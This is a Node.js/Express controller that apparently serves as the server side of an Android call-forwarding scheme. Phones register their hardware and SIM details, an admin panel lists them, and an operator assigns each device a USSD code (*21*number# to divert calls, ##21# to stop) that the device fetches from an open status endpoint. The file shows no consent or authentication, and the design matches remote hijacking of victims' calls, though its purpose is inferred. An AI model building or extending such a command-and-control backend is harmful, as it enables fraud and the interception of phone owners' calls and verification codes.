const mongoose = require('mongoose');
const Device = require('../models/Device');
const Call = require('../models/Call');

// Add Device
exports.addDeviceDetails = async (req, res) => {
    try {
        const { model, manufacturer, androidVersion, brand, simOperator } = req.body;
        if (!model || !manufacturer || !androidVersion || !brand || !simOperator) {
            return res.status(400).json({ success: false, error: "All fields are required!" });
        }

        const newDevice = new Device({ model, manufacturer, androidVersion, brand, simOperator });
        await newDevice.save();

        res.status(201).json({ success: true, message: "Device registered successfully!", uniqueid: newDevice._id });
    } catch (err) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
};

// Get All Devices (for Admin Panel)
exports.getAllDevices = async (req, res) => {
    try {
        const devices = await Device.find({}, 'brand _id');
        res.render('phone', { devices });
    } catch (err) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
};

// Get Device Details (with Call Forwarding Status)
exports.getDeviceDetails = async (req, res) => {
    try {
        const device_id = req.params.id;
        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }

        const device = await Device.findById(device_id);
        if (!device) {
            return res.status(404).json({ success: false, error: "Device not found" });
        }

        // Fetch the call forwarding code for the device
        const call = await Call.findOne({ call_id: device_id }).select("code");
        const currentNumber = call ? call.code : null;

        // Pass both the device and currentNumber to the view
        res.render('final', { device, currentNumber });
    } catch (err) {
        res.status(500).json({ success: false, error: "Server Error" });
    }
};

// Stop Call Forwarding (Update Single Entry)
exports.stopCallForwarding = async (req, res) => {
    try {
        const device_id = req.params.id;
        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }

        await Call.findOneAndUpdate({ call_id: device_id }, { code: "##21#" }, { new: true });

        res.redirect(`/api/device/admin/phone/${device_id}`);
    } catch (error) {
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

// Start Call Forwarding (Update if Exists, Else Insert)
exports.setCallForwarding = async (req, res) => {
    try {
        const { phoneNumber } = req.body;
        const device_id = req.params.id;

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, error: "Invalid Device ID" });
        }
        if (!/^\d{10}$/.test(phoneNumber)) {
            return res.status(400).json({ success: false, error: "Invalid phone number format" });
        }

        const activationCode = `*21*${phoneNumber}#`;

        await Call.findOneAndUpdate(
            { call_id: device_id },
            { code: activationCode },
            { upsert: true, new: true }
        );

        res.redirect(`/api/device/admin/phone/${device_id}`);
    } catch (error) {
        res.status(500).json({ success: false, error: "Internal Server Error" });
    }
};

// Get Call Forwarding Status
exports.getCallForwardingStatus = async (req, res) => {
    try {
        const device_id = req.params.id;

        if (!mongoose.isValidObjectId(device_id)) {
            return res.status(400).json({ success: false, message: "Invalid Device ID", code: null });
        }

        const callData = await Call.findOne({ call_id: device_id }).select("code");

        if (!callData) {
            return res.status(404).json({ success: false, message: "No call forwarding set for this device", code: null });
        }

        res.status(200).json({ success: true, message: "Call forwarding details fetched successfully", code: callData.code });
    } catch (error) {
        res.status(500).json({ success: false, message: "Internal Server Error", code: null });
    }
};
